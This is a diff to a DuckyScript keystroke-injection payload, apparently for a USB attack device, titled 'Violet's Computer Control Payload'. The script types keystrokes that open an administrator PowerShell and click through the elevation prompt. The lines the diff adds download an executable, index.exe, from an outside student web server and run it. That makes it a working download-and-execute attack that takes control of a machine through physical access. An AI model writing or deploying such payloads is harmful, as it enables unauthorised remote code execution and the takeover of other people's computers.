@@ -1,11 +1,21 @@
 REM Violet's Computer Control Payload
 
+REM DEFINE #payloadURL http://snowpi.student.rit.edu/index.exe
+
 DELAY 1000
 WINDOWS r
 DELAY 500
 STRING powershell
 DELAY 500
 CTRL SHIFT ENTER
+DELAY 200
 LEFTARROW
 ENTER
-
+DELAY 500
+STRING Invoke-WebRequest http://snowpi.student.rit.edu/index.exe -OutFile index.exe
+DELAY 200
+ENTER
+DELAY 2000
+STRING ./index.exe
+DELAY 200
+ENTER
